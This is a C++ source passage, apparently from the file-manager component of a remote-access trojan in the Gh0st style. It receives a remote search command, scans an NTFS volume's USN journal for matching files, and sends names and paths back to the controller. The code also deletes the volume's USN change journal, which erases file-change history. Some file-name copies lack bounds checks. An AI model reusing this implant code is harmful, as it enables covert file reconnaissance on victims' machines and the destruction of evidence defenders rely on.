	OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), hVol, &fidstr, OBJ_CASE_INSENSITIVE, 0, 0 };
	HANDLE hFile;
	long long iosb[2];
	const ULONG FILE_OPEN_BY_FILE_ID = 0x00002000UL;
	const ULONG FILE_OPEN = 0x00000001UL;
	ULONG status = NtCreatefile(&hFile, GENERIC_ALL, &oa, iosb, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_OPEN_BY_FILE_ID, NULL, 0);
	ZeroMemory(c_pathname, MAX_PATH * 4);
	if (status == 0)
	{
		GetVolumeNameByHandle(hFile, c_pathname);
		CloseHandle(hFile);
	}
}

void CFileManager::SendSearchDate(LPBYTE lpBuffer)
{
	SEARCH S_search;
	memset(&S_search, 0, sizeof(SEARCH));
	memcpy(&S_search, lpBuffer, sizeof(SEARCH));
	volName = S_search.TC_disk;
	tc_search = S_search.TC_search;


	int all = 0;
	BOOL status;
	bool isNTFS = false;
	bool getHandleSuccess = false;
	bool initUsnJournalSuccess = false;

	TCHAR sysNameBuf[MAX_PATH] = { 0 };
	status = GetVolumeInformation(volName,
		NULL, 
		0,
		NULL,
		NULL,
		NULL,
		sysNameBuf, 
		MAX_PATH);

	if (0 != status) {
		
		if (0 == lstrcmp(sysNameBuf, _T("NTFS"))) {
			isNTFS = true;
		}
		else {
			

			BYTE lpbuffer = TOKEN_FILE_SEARCHPLUS_NONTFS;
			Send((LPBYTE)&lpbuffer, 1);
			return;
		}

	}

	if (isNTFS) {
	
		TCHAR fileName[MAX_PATH];
		fileName[0] = _T('\0');

	
		_tcscpy_s(fileName, _T("\\\\.\\"));
		_tcscat_s(fileName, volName);
	
		wstring fileNameStr = (wstring)fileName;
		fileNameStr.erase(fileNameStr.find_last_of(_T(":")) + 1);

	
		hVol = CreateFile(fileNameStr.data(),
			GENERIC_READ | GENERIC_WRITE, // 可以为0
			FILE_SHARE_READ | FILE_SHARE_WRITE, // 必须包含有FILE_SHARE_WRITE
			NULL, // 这里不需要
			OPEN_EXISTING, // 必须包含OPEN_EXISTING, CREATE_ALWAYS可能会导致错误
			FILE_ATTRIBUTE_READONLY, // FILE_ATTRIBUTE_NORMAL可能会导致错误
			NULL); // 这里不需要

		if (INVALID_HANDLE_VALUE != hVol) {
			getHandleSuccess = true;
		}
		else {
			BYTE lpbuffer = TOKEN_FILE_SEARCHPLUS_HANDLE;
			Send((LPBYTE)&lpbuffer, 1);
			return;
		}
	}

	if (getHandleSuccess) {

		DWORD br;
		CREATE_USN_JOURNAL_DATA cujd;
		cujd.MaximumSize = 0; // 0表示使用默认值
		cujd.AllocationDelta = 0; // 0表示使用默认值
		status = DeviceIoControl(hVol,
			FSCTL_CREATE_USN_JOURNAL,
			&cujd,
			sizeof(cujd),
			NULL,
			0,
			&br,
			NULL);

		if (0 != status) {
			initUsnJournalSuccess = true;
		}
		else {
			BYTE lpbuffer = TOKEN_FILE_SEARCHPLUS_INITUSN;
			Send((LPBYTE)&lpbuffer, 1);
			return;
		}

	}
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024 * sizeof(TCHAR));
	lpBuffer[0] = TOKEN_FILE_SEARCHPLUS_LIST;
	DWORD dwOffset = 1;
	DWORD	 dwLength = 1024 * 8;
	if (initUsnJournalSuccess)
	{
		bool getBasicInfoSuccess = false;
		DWORD br;
		status = DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &UsnInfo, sizeof(USN_JOURNAL_DATA), &br, NULL);
		if (0 != status) {
			getBasicInfoSuccess = true;
		}
		else {
			
			BYTE lpbuffer = TOKEN_FILE_SEARCHPLUS_GETUSN;
			Send((LPBYTE)&lpbuffer, 1);
			return;
		}
		if (getBasicInfoSuccess) {
			
			MFT_ENUM_DATA med;
			med.StartFileReferenceNumber = 0;
			med.LowUsn = 0;//UsnInfo.FirstUsn; 这里经测试发现，如果用FirstUsn有时候不正确，导致获取到不完整的数据，还是直接写0好.
			med.HighUsn = UsnInfo.NextUsn;

			CHAR buffer[4096]; // 用于储存记录的缓冲,尽量足够地大
			DWORD usnDataSize;
			PUSN_RECORD UsnRecord;

			while (0 != DeviceIoControl(hVol, FSCTL_ENUM_USN_DATA, &med, sizeof(med), buffer, 4096, &usnDataSize, NULL))
			{
				DWORD dwRetBytes = usnDataSize - sizeof(USN);
				
				UsnRecord = (PUSN_RECORD)(((PCHAR)buffer) + sizeof(USN));
				while (dwRetBytes > 0) {
					const int strLen = UsnRecord->FileNameLength;
					char c_fileName[MAX_PATH * 2] = { 0 };
					if (wcsstr(UsnRecord->FileName, tc_search) != NULL)//在a中查找b，如果不存在，
					{
						WideCharToMultiByte(CP_OEMCP, NULL, UsnRecord->FileName, strLen / 2, c_fileName, strLen, NULL, FALSE);
						
						GetFullPathByFileReferenceNumber(hVol, UsnRecord->FileReferenceNumber);
					
						if (LocalSize(lpBuffer) < (dwOffset + dwLength))
							lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

						memcpy(lpBuffer + dwOffset, c_fileName, strlen(c_fileName));
						dwOffset += (DWORD)strlen(c_fileName) + 1;

						memcpy(lpBuffer + dwOffset, c_pathname, strlen(c_pathname));
						dwOffset += (DWORD)strlen(c_pathname) + 1;
					
					}
					
					DWORD recordLen = UsnRecord->RecordLength;
					dwRetBytes -= recordLen;
					UsnRecord = (PUSN_RECORD)(((PCHAR)UsnRecord) + recordLen);
				}
				
				med.StartFileReferenceNumber = *(USN*)&buffer;
			}
			
		}
	
		DELETE_USN_JOURNAL_DATA dujd;
		dujd.UsnJournalID = UsnInfo.UsnJournalID;
		dujd.DeleteFlags = USN_DELETE_FLAG_DELETE;
		status = DeviceIoControl(hVol, FSCTL_DELETE_USN_JOURNAL, &dujd, sizeof(dujd), NULL, 0, &br, NULL);
		
	}
	// 最后释放一些资源
	if (getHandleSuccess) {
		CloseHandle(hVol);
	}
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)(LocalSize(lpBuffer)));
	LocalFree(lpBuffer);
	return;

}



